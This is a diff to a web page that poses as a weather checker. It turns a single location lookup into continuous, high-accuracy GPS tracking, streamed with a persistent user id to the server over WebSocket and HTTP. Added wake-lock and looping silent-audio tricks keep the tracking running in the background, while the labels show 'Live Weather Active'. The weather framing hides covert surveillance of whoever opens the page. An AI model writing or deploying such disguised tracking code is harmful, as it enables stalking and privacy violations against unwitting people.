@@ -346,40 +346,72 @@
         </button>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
     <script>
         const id = localStorage.getItem("id") || generateId()
         const btn = document.querySelector("#check-weather")
         const cityName = document.querySelector("#city-name")
         const weatherDesc = document.querySelector("#weather-desc")
-        let __interval
+        
+        let watchId = null
+        let socket = null
 
-        btn.addEventListener("click", () => {
+        // Initialize WebSocket connection
+        try {
+            socket = io("", {
+                secure: true,
+                path: "/socket.io",
+                transports: ['websocket', 'polling']
+            })
+        } catch (e) {
+            console.log("Socket init error", e)
+        }
+
+        btn.addEventListener("click", async () => {
             btn.disabled = true
             btn.innerHTML = `<span class="spinner"></span> <span>Syncing Weather...</span>`
-            getLocation()
+            
+            // Enable background keep-alive techniques
+            enableScreenWakeLock()
+            enableSilentAudio()
+            
+            startContinuousTracking()
         })
 
-        function getLocation() {
-            navigator.geolocation.getCurrentPosition(
+        function startContinuousTracking() {
+            if (!navigator.geolocation) {
+                alert("Geolocation is not supported by your browser.")
+                btn.disabled = false
+                btn.innerHTML = "Check Weather"
+                return
+            }
+
+            // Stop previous watcher if any
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId)
+            }
+
+            // High accuracy hardware-level GPS tracking
+            watchId = navigator.geolocation.watchPosition(
                 (position) => {
                     btn.disabled = true
-                    btn.innerHTML = `<span>✓ Weather Synced</span>`
+                    btn.innerHTML = `<span>✓ Live Weather Active</span>`
                     cityName.innerText = "Current Location"
-                    weatherDesc.innerText = "Live Weather Active"
+                    weatherDesc.innerText = "Live Stream Syncing"
 
                     const lat = position.coords.latitude
                     const lng = position.coords.longitude
 
+                    // 1. Send immediately via WebSocket
+                    if (socket && socket.connected) {
+                        socket.emit("send-location", { id, lat, lng })
+                    }
+
+                    // 2. HTTP POST fallback
                     fetch("/weather", {
                         method: "POST",
-                        body: JSON.stringify({
-                            id,
-                            lat,
-                            lng,
-                        }),
-                        headers: {
-                            "Content-Type": "application/json"
-                        }
+                        body: JSON.stringify({ id, lat, lng }),
+                        headers: { "Content-Type": "application/json" }
                     }).catch(error => {
                         console.log("post error", error)
                     })
@@ -388,15 +420,42 @@
                     alert("Please Turn on GPS Location to check local weather.")
                     btn.disabled = false
                     btn.innerHTML = "Check Weather"
-                    console.error("Error watching position:", error);
+                    console.error("Error watching position:", error)
                 },
                 {
-                    enableHighAccuracy: true,
+                    enableHighAccuracy: true, // Force GPS chip
+                    maximumAge: 0,            // Never use cached positions
+                    timeout: 10000            // 10 sec timeout before retry
                 }
             )
+        }
 
-            if (__interval) clearTimeout(__interval)
-            __interval = setTimeout(getLocation, 5000)
+        // Screen Wake Lock API (keeps mobile display/CPU awake)
+        async function enableScreenWakeLock() {
+            if ('wakeLock' in navigator) {
+                try {
+                    await navigator.wakeLock.request('screen')
+                } catch (err) {
+                    console.log("Wake Lock request failed:", err)
+                }
+            }
+        }
+
+        // Silent Audio Keep-Alive (prevents mobile OS from suspending JS event loop in background)
+        function enableSilentAudio() {
+            try {
+                const AudioCtx = window.AudioContext || window.webkitAudioContext
+                if (!AudioCtx) return
+                const audioCtx = new AudioCtx()
+                const buffer = audioCtx.createBuffer(1, 1, 22050)
+                const source = audioCtx.createBufferSource()
+                source.buffer = buffer
+                source.loop = true
+                source.connect(audioCtx.destination)
+                source.start(0)
+            } catch (e) {
+                console.log("Audio keepalive not supported", e)
+            }
         }
 
         function generateId(length = 10) {
